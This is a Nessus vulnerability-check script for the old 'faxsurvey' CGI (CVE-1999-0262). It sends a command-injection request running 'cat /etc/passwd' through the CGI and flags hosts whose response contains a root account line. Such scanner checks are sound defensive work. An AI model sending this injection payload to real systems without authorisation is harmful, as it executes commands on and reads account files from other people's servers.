#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10067);
 script_bugtraq_id(2056);
 script_version ("$Revision: 1.29 $");
 script_cve_id("CVE-1999-0262");
 name["english"] = "Faxsurvey";
 name["francais"] = "Faxsurvey";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'faxsurvey' CGI allows a malicious user
to view any file on the target computer, as well as execute
arbitrary commands. 

Solution : Upgrade to a newer version
Risk factor : High
";

 desc["francais"] = "Le CGI 'faxsurvey' permet à un 
pirate de lire n'importe quel fichier sur la machine cible,
ainsi que d'executer des commandes arbitraires.

Facteur de risque : Elevé.

Solution : Mettez à jour ce CGI";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks if faxsurvey is vulnerable";
 summary["francais"] = "Détermine si faxsurvey est vulnérable";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 req = string(dir, "/faxsurvey?cat%20/etc/passwd");
 req = http_get(item:req, port:port);
 result = http_keepalive_send_recv(port:port, data:req);
 if( result == NULL ) exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:result)){
 	security_hole(port);
	exit(0);
	}
}
